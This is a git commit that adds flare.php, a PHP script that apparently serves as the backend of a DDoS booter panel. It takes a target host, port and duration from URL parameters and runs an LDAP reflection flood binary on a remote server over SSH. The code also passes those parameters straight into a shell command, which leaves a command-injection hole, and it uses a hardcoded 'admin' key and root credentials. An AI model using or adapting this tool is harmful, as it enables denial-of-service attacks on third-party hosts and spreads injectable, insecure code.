5689499545867472e0459b0362f66c754dd76db4
nek0s <34940771+nek0s@users.noreply.github.com>
2018-01-31 22:24:01 +0100

    Create flare.php

---
+++ flare.php
@@ -0,0 +1,96 @@
+<?php
+
+//made by @Psychadelix
+//discord Psychadelix#8740
+
+//$db = new mysqli("localhost", "root", "", "api-logs");
+
+//if (mysqli_connect_errno()) {
+ //   printf("Connect failed: %s\n", mysqli_connect_error());
+//  exit();
+//}
+
+$serverip = "127.0.0.1"; //it is not recommended to host the api on the same server it runs the commands on.
+$port = "22";
+
+$name = "root"; //we do not suggest using root.
+$pass = "password"; //make sure you set a strong password.
+
+
+//Check if the ssh2 function exists. If not kill the process.
+if (!function_exists("ssh2_connect"))  /* -> Kill the process if php ssh2 can't be found. */  die("function ssh2_connect not found.");
+
+//attempt to connect to the server.
+if (!($con = ssh2_connect($serverip, $port))){
+  die('Connection to '. $serverip .' has failed. are you sure it has ssh2 installed?');
+}
+else{
+
+  //verify logins
+  if(!ssh2_auth_password($con, $name, $pass)) {
+    print('Authencation failed to: '. $serverip .' '. $port .' '. $name .' '. $pass .' ');
+
+  }
+  else{
+
+    //You're logged in here. Time for action.
+
+  $command = $_GET['command'];
+
+  if (empty($_GET['command'])){
+    print('No command defined to execute.');
+  }
+  else{
+
+      $key = array("admin");
+
+      if(in_array($_GET['key'], $key)){
+        switch($command){
+
+          
+          //https://example.com/api.php?command=ldap&key=admin&host=1.1.1.1&port=80&time=60
+          $host = $_GET['host'];
+          $port = $_GET['port'];
+          $time = $_GET['time'];
+
+          case 'ldap':
+
+            if (empty($host) || empty($port) || empty($time)){
+              die('You have not specified proper attack arguments.');
+            }
+
+            if (!($stream = ssh2_exec($con, "screen - ./ldap $host $port ldap.txt 2 250 $time "))){
+              print $command . " " . "failed to execute..";
+              die();
+            }
+            else{
+              print('Command has been executed. without any errors.');
+            }
+          break;
+
+          case 'second':
+            if (!($stream = ssh2_exec($con, "screen -dmS second"))){
+              print $command . " " . "failed to execute..";
+              die();
+            }
+            else{
+                print('Command has been executed. without any errors.');
+              }
+          break;
+
+          //throw this when the specified command is invalid.
+          default :
+            echo "Command:" . " " . $command . " " . "Not found";
+            break;
+        }
+      }
+      else{
+        print('Invalid key defined. Attempt logged.'); //this message shows when an invalid key has been specified.
+
+
+      // $sql = $db->query(""); //finish this later.
+      }
+    }
+  }
+}
+?>
